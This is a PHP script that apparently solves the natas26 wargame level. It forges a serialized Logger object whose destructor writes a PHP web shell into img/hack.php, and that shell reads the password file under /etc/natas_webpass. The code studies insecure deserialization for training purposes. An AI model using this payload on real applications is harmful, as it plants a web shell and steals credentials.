<?php
// example code

// class Logger{
//         private $logFile;
//         private $initMsg;
//         private $exitMsg;

//         function __construct($file){
//             // initialise variables
//             $this->initMsg="#--session started--#\n";
//             $this->exitMsg="#--session end--#\n";
//             $this->logFile = "/tmp/natas26_" . $file . ".log";

//             // write initial message
//             $fd=fopen($this->logFile,"a+");
//             fwrite($fd,$this->initMsg);
//             fclose($fd);
//         }

//         function log($msg){
//             $fd=fopen($this->logFile,"a+");
//             fwrite($fd,$msg."\n");
//             fclose($fd);
//         }

//         function __destruct(){
//             // write exit message
//             $fd=fopen($this->logFile,"a+");
//             fwrite($fd,$this->exitMsg);
//             fclose($fd);
//         }
//     }

// $data = new Logger("test");
// echo serialize($data) . "\r\n";

$serializedData = 'O:6:"Logger":3:{s:15:"LoggerlogFile";s:13:"img/hack.php";s:15:"LoggerinitMsg";s:22:"#--session started--# ";s:15:"LoggerexitMsg";s:53:"<?php passthru(\'cat /etc/natas_webpass/natas27\') ?>";}';
echo base64_encode($serializedData);

echo "\n";
$test = unserialize($serializedData);
echo $test;